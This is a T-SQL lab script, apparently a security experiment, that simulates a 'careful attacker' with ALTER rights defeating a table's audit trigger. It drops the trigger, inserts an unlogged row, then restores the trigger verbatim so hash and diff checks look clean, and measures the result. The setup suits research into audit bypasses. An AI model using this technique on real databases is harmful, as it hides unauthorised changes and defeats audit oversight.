-- 1C: replace the audit trigger (needs ALTER on the table). Capture the exact definition,
-- DROP to blind, then recreate it VERBATIM (careful attacker) -> object diff is clean.
USE labdb;
GO
GRANT ALTER ON dbo.app_accounts TO app_user;   -- knob: ownership/ALTER misconfig
GO
SELECT 'SNAP 1C before hash=' + CONVERT(varchar(64),
   HASHBYTES('SHA2_256', OBJECT_DEFINITION(OBJECT_ID('dbo.accounts_audit'))),2) AS res;
IF OBJECT_ID('tempdb..##orig1c') IS NOT NULL DROP TABLE ##orig1c;
SELECT OBJECT_DEFINITION(OBJECT_ID('dbo.accounts_audit')) AS d INTO ##orig1c;
GO
EXECUTE AS USER='app_user';
  DROP TRIGGER dbo.accounts_audit;                                   -- blind (needs ALTER on table)
  INSERT INTO dbo.app_accounts(holder,balance_cents) VALUES('sentinel-1C',100);   -- unlogged
  DECLARE @d NVARCHAR(MAX)=(SELECT d FROM ##orig1c);
  BEGIN TRY EXEC(@d); END TRY BEGIN CATCH PRINT 'restore-failed: '+ERROR_MESSAGE(); END CATCH;  -- verbatim restore
  INSERT INTO dbo.app_accounts(holder,balance_cents) VALUES('sentinel-1C-ctl',101); -- logged again
REVERT;
GO
SELECT 'RES 1C blinded_logged=' + CAST((SELECT COUNT(*) FROM dbo.audit_logged_actions WHERE JSON_VALUE(row_data,'$[0].holder')='sentinel-1C') AS varchar(4))
     + ' ctl_logged=' + CAST((SELECT COUNT(*) FROM dbo.audit_logged_actions WHERE JSON_VALUE(row_data,'$[0].holder')='sentinel-1C-ctl') AS varchar(4)) AS res;
SELECT 'SNAP 1C after hash=' + CONVERT(varchar(64),
   HASHBYTES('SHA2_256', OBJECT_DEFINITION(OBJECT_ID('dbo.accounts_audit'))),2) AS res;
GO
